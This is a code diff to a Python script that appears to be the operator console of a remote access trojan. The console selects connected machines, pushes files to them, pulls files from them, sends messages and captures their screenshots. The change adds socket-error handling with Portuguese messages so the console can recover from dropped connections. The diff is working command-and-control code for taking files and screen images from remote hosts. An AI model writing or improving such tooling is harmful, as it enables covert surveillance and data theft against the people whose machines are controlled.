@@ -125,20 +125,27 @@ def upload_file():
         except:
             print("[-] File not found!")
 
-    splited_directory = file_directory.split("/")
-    file_name = splited_directory[len(splited_directory)-1]
-    send_data(f'upload-file {file_name}'.encode())
+    try:        
+        splited_directory = file_directory.split("/")
+        file_name = splited_directory[len(splited_directory)-1]
+        send_data(f'upload-file {file_name}'.encode())
 
-    file = open(file_directory, "rb")
-    bytes_read = file.read(4096)
-
-    while bytes_read:
-        send_data(bytes_read)
+        file = open(file_directory, "rb")
         bytes_read = file.read(4096)
 
-    time.sleep(1)
-    file.close()
-    send_data('done'.encode())
+        while bytes_read:
+            send_data(bytes_read)
+            bytes_read = file.read(4096)
+
+        time.sleep(1)
+        file.close()
+        send_data('done'.encode())
+    except socket.error:
+        print("Não foi possível enviar os dados, a conexão foi perdida")
+        time.sleep(1)
+        close_connection_by_id()
+        time.sleep(2)
+        menu_command_options()
 
 
 def download_file():
@@ -147,58 +154,80 @@ def download_file():
     file_directory = input('Type the file directory >> ')
     file_name = file_directory.split('/')[-1]
 
-    send_data(f'download-file {file_directory}'.encode())
+    try:
+        send_data(f'download-file {file_directory}'.encode())
 
-    if receive_data(4096) == 'NotFound'.encode():
-        print('File not found!')
-        return
+        if receive_data(4096) == 'NotFound'.encode():
+            print('File not found!')
+            return
 
-    file = open(file_name, 'wb')
+        file = open(file_name, 'wb')
 
-    print("[*] Downloading file...")
+        print("[*] Downloading file...")
 
-    while True:
-        response = receive_data(4096)
-        try:
-            if decode_utf8(response) == 'done':
-                break
-            file.write(response)
-        except:
-            file.write(response)
+        while True:
+            response = receive_data(4096)
+            try:
+                if decode_utf8(response) == 'done':
+                    break
+                file.write(response)
+            except:
+                file.write(response)
 
-    print("\n[+] File downloaded")
+        print("\n[+] File downloaded")
 
-    file.close()
+        file.close()
+    except socket.error:
+        print("Não foi possível enviar os dados, a conexão foi perdida")
+        time.sleep(1)
+        close_connection_by_id()
+        time.sleep(2)
+        menu_command_options()
 
 
 def send_message():
     message = input('Write the message >> ')
-    send_data('message'.encode())
-    time.sleep(0.2)
-    send_data(message.encode())
-    time.sleep(0.2)
-    send_data('done'.encode())
+    try:
+        send_data('message'.encode())
+        time.sleep(0.2)
+        send_data(message.encode())
+        time.sleep(0.2)
+        send_data('done'.encode())
+    except socket.error:
+        print("Não foi possível enviar os dados, a conexão foi perdida")
+        time.sleep(1)
+        close_connection_by_id()
+        time.sleep(2)
+        menu_command_options()
+
 
 
 def receive_screenshot():
     global selected_connection
 
-    selected_connection.send(str.encode("screenshot"))
-    print("[*] Taking a screenshot...")
-    file_name = time.strftime("%Y%m%d%H%M%S" + ".png")
-    picture = open(file_name, "wb")
+    try:
+        selected_connection.send(str.encode("screenshot"))
+        print("[*] Taking a screenshot...")
+        file_name = time.strftime("%Y%m%d%H%M%S" + ".png")
+        picture = open(file_name, "wb")
 
-    while True:
-        response = receive_data(4096)
-        try:
-            if decode_utf8(response) == 'done':
-                break
-            picture.write(response)
-        except:
-            picture.write(response)
+        while True:
+            response = receive_data(4096)
+            try:
+                if decode_utf8(response) == 'done':
+                    break
+                picture.write(response)
+            except:
+                picture.write(response)
 
-    print("\n[+] Received screenshot from now...")
-    picture.close()
+        print("\n[+] Received screenshot from now...")
+        picture.close()
+    except socket.error:
+        print("Não foi possível enviar os dados, a conexão foi perdida")
+        time.sleep(1)
+        close_connection_by_id()
+        time.sleep(2)
+        menu_command_options()
 
 
 def sleep_session():
